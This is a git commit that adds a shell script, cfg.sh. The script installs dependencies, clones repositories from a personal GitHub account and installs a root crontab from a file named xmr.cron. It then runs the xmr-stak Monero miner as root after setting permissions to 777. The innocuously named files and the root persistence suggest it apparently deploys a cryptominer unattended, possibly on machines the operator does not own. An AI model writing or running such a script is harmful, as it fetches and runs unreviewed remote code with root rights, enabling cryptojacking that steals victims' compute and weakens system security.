e71194d9bd9066325e30286c53e9a26d5774ae6b
merrygreek <merrygreek@163.com>
2018-04-13 17:44:51 +0800

    first commit

---
+++ cfg.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+sudo apt-get update
+cd /home
+sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git
+cd /home
+sudo git clone https://github.com/merrygreek/configa.git
+cd /home/configa
+sudo chmod 777 change.sh
+sudo chmod 777 xmr.cron
+sudo crontab -u root xmr.cron
+sudo service cron restart
+cd /home
+sudo git clone https://github.com/merrygreek/u6.git
+sudo git clone https://github.com/merrygreek/1.git
+sudo cp -r u6/ /home/bin
+sudo cp -r 1/*.txt /home/bin/
+cd /home/bin
+sudo chmod 777 ./xmr-stak
+sudo ./xmr-stak
